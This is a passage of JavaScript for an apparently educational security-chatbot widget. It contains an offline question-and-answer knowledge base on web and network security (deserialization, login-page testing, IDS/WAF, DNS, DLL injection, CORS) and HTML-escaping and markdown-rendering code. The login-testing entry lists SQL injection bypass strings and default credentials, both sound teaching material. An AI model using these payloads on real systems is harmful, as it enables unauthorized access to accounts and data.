When an application deserializes untrusted data, allowing object manipulation.

**Languages affected:** Java, PHP, Python, .NET, Ruby

**Impact:** RCE, privilege escalation, DoS

**Java example:**
• Tools: ysoserial generates malicious serialized objects
• Indicator: \`rO0AB\` (Base64) or \`AC ED 00 05\` (hex) = Java serialized data

**PHP example:**
• Magic methods: \`__wakeup()\`, \`__destruct()\`
• Modify serialized string to change object properties

**Prevention:**
• Don't deserialize untrusted data!
• Use JSON instead of native serialization
• Integrity checks (HMAC) on serialized data
• Isolate deserialization in low-privilege environments`
      },
      // === Scenario: Login Page ===
      {
        keywords: ['login page', 'test login', 'login scenario', 'black box', 'how to test'],
        answer: `**Scenario: Black Box Testing a Login Page**

**Step-by-step approach:**

1️⃣ **Reconnaissance**
• Check page source, hidden fields, comments
• Identify technology (Wappalyzer)

2️⃣ **Authentication Tests**
• SQL Injection: \`' OR 1=1 --\`, \`admin'--\`
• Default credentials: admin/admin, test/test
• Brute force (Burp Intruder)
• Username enumeration (different error messages)

3️⃣ **Session Management**
• Check cookie flags (HttpOnly, Secure, SameSite)
• Session fixation test
• Token randomness analysis

4️⃣ **Business Logic**
• Account lockout policy
• Rate limiting
• Password policy enforcement
• "Remember me" functionality

5️⃣ **Other Tests**
• HTTPS enforced?
• CSRF token on login form?
• Clickjacking (X-Frame-Options)
• Password reset flow
• Registration page for mass assignment`
      },
      // === Firewall / IDS / IPS ===
      {
        keywords: ['firewall', 'ids', 'ips', 'intrusion detection', 'intrusion prevention', 'waf'],
        answer: `**Firewall vs IDS vs IPS vs WAF:**

| Feature | Firewall | IDS | IPS | WAF |
|---------|----------|-----|-----|-----|
| **Function** | Filter traffic | Detect attacks | Detect & block | Web app protection |
| **Action** | Allow/deny | Alert only | Alert & block | Filter HTTP |
| **Layer** | Network (L3-4) | Network/Host | Network/Host | Application (L7) |
| **Example** | iptables, pfSense | Snort (passive) | Snort (inline) | ModSecurity, Cloudflare |

**IDS types:**
• **NIDS** — Network-based (monitors traffic)
• **HIDS** — Host-based (monitors files/logs)

**Detection methods:**
• **Signature-based** — Known attack patterns (fast, can't detect 0-day)
• **Anomaly-based** — Deviation from baseline (can detect 0-day, more false positives)`
      },
      // === DNS ===
      {
        keywords: ['dns', 'domain name', 'dns records', 'domain resolution'],
        answer: `**DNS (Domain Name System):**

Translates domain names → IP addresses.

**Record Types:**
• **A** — Domain → IPv4
• **AAAA** — Domain → IPv6
• **CNAME** — Alias to another domain
• **MX** — Mail server
• **NS** — Nameserver
• **TXT** — Text records (SPF, DKIM, verification)
• **SOA** — Start of Authority
• **PTR** — Reverse lookup (IP → Domain)

**DNS Security Issues:**
• **DNS Spoofing/Poisoning** — Fake DNS responses
• **DNS Zone Transfer** — Dump all records (AXFR) if misconfigured
• **DNS Tunneling** — Exfiltrate data through DNS queries
• **Subdomain takeover** — Claim unclaimed subdomains

**Command:** \`nslookup\`, \`dig\`, \`host\``
      },
      // === Process Hijacking ===
      {
        keywords: ['process hijacking', 'process injection', 'dll injection', 'dll hijacking'],
        answer: `**Process Hijacking / Injection:**

Injecting malicious code into a running process.

**Techniques:**
• **DLL Injection** — Force process to load malicious DLL
• **DLL Hijacking** — Place malicious DLL in search path
• **Process Hollowing** — Replace legitimate process memory with malicious code
• **Thread Hijacking** — Modify existing thread to execute malicious code
• **Reflective DLL Injection** — Load DLL from memory (no disk artifact)

**Impact:** Code execution under trusted process, AV evasion, privilege escalation

**Detection:**
• Monitor unusual DLL loads
• Check for unsigned DLLs
• Monitor process creation chains
• EDR solutions

**Prevention:**
• Code signing enforcement
• Restrict DLL search paths
• Application whitelisting
• Monitor \`CreateRemoteThread\`, \`VirtualAllocEx\` API calls`
      },
      // === CORS ===
      {
        keywords: ['cors', 'cross origin', 'cross-origin', 'same origin policy', 'sop'],
        answer: `**CORS (Cross-Origin Resource Sharing):**

**Same-Origin Policy (SOP):** Browser blocks requests between different origins (protocol + domain + port).

**CORS relaxes SOP** by adding headers:
• \`Access-Control-Allow-Origin: https://trusted.com\`
• \`Access-Control-Allow-Credentials: true\`

**Misconfiguration attacks:**
• Reflecting any Origin → \`Access-Control-Allow-Origin: https://evil.com\`
• Using \`null\` origin
• Wildcard with credentials

**Impact:** Steal user data from APIs

**Prevention:**
• Whitelist specific trusted origins
• Never reflect Origin blindly
• Don't use \`Access-Control-Allow-Origin: *\` with credentials
• Validate Origin header server-side`
      }
    ];

    // Search for best match
    let bestMatch = null;
    let bestScore = 0;

    for (const entry of knowledge) {
      let score = 0;
      for (const kw of entry.keywords) {
        if (q.includes(kw)) {
          score += kw.length; // Longer keyword = better match
        }
      }
      if (score > bestScore) {
        bestScore = score;
        bestMatch = entry;
      }
    }

    if (bestMatch && bestScore > 0) {
      return bestMatch.answer;
    }

    // Fuzzy / partial matching
    const words = q.split(/\s+/).filter(w => w.length > 2);
    for (const entry of knowledge) {
      for (const kw of entry.keywords) {
        for (const word of words) {
          if (kw.includes(word) || word.includes(kw)) {
            return entry.answer;
          }
        }
      }
    }

    // Default response
    return `I don't have a specific offline answer for that, but here are some tips:

🔍 **Try asking about:**
• Specific attacks: XSS, SQLi, CSRF, SSRF, XXE, IDOR, LFI/RFI
• Concepts: OWASP Top 10, Authentication vs Authorization, Encoding vs Encryption
• Tools: Burp Suite, Nmap, Linux commands
• Networking: OSI Model, TCP/IP, DNS, Common Ports
• Scenarios: "How to test a login page?"
• Interview topics: VAPT methodology, Session Management, JWT

⚙️ **For smarter answers**, add your free Gemini API key in Settings!
Get one at: [aistudio.google.com/apikey](https://aistudio.google.com/apikey)`;
  }

  // ── HTML Escaping (Prevents <iframe>, <script>, etc. from hijacking DOM) ──
  function escapeHTML(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  // ── Markdown formatter (clean, safe & human-friendly) ──
  function formatMarkdown(text) {
    if (!text) return '';

    let processed = text;

    // Step 1: Fix unclosed code blocks during streaming
    const codeBlockCount = (processed.match(/```/g) || []).length;
    if (codeBlockCount % 2 !== 0) {
      processed += '\n```';
    }

    // Step 2: Extract code blocks and escape their contents safely
    const codeBlocks = [];
    processed = processed.replace(/```(\w*)\n([\s\S]*?)```/g, (match, lang, code) => {
      const placeholder = `__CODE_BLOCK_${codeBlocks.length}__`;
      codeBlocks.push(`<pre><code class="lang-${lang}">${escapeHTML(code)}</code></pre>`);
      return placeholder;
    });

    // Step 3: Extract inline code and escape its contents
    const inlineCodes = [];
    processed = processed.replace(/`([^`\n]+)`/g, (match, code) => {
      const placeholder = `__INLINE_CODE_${inlineCodes.length}__`;
      inlineCodes.push(`<code>${escapeHTML(code)}</code>`);
      return placeholder;
    });

    // Step 4: Escape ALL raw HTML in regular prose!
    // (This guarantees <iframe...>, <script...>, etc. render as text rather than real DOM elements)
    processed = escapeHTML(processed);

    // Step 5: Convert Markdown syntax to safe HTML tags
    processed = processed
      // Convert any 1 to 6 # headers to clean styled headers
      .replace(/^\s*#{1,6}\s*(.+)$/gm, '<div class="chat-section-header">$1</div>')
      // Strip any stray raw #### or ##### that might appear anywhere
      .replace(/#{2,}/g, '')
      // Bold
      .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
      // Italic
      .replace(/_([^_]+)_/g, '<em>$1</em>')
      // Links
      .replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>')
      // Horizontal rules
      .replace(/^---+$/gm, '<hr class="chat-divider">')
      // Tables
      .replace(/^\|(.+)\|$/gm, (match) => {
        const cells = match.split('|').filter(c => c.trim());
        if (cells.every(c => /^[-:\s]+$/.test(c))) return '';
        return '<tr>' + cells.map(c => `<td>${c.trim()}</td>`).join('') + '</tr>';
      })
      .replace(/(<tr>[\s\S]*?<\/tr>)/g, '<table class="chat-table">$1</table>')
      .replace(/<\/table>\s*<table class="chat-table">/g, '')
      // Bullet points (handles •, -, *, and numbered 1. 2.)
      .replace(/^\s*[•\-\*]\s+(.+)$/gm, '<li>$1</li>')
      .replace(/^\s*(\d+)\.\s+(.+)$/gm, '<li><strong>$1.</strong> $2</li>')
      .replace(/(<li>[\s\S]*?<\/li>)/g, '<ul>$1</ul>')
      .replace(/<\/ul>\s*<ul>/g, '')
      // Clean paragraphs & line breaks
      .replace(/\n\n+/g, '<br><br>')
      .replace(/\n/g, '<br>');

    // Step 6: Restore code blocks and inline code
    codeBlocks.forEach((block, i) => {
      processed = processed.replace(`__CODE_BLOCK_${i}__`, block);
    });
    inlineCodes.forEach((inline, i) => {
      processed = processed.replace(`__INLINE_CODE_${i}__`, inline);
    });

    return processed;
  }

  // ── Initialize ──
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', createChatWidget);
  } else {
    createChatWidget();
  }
})();

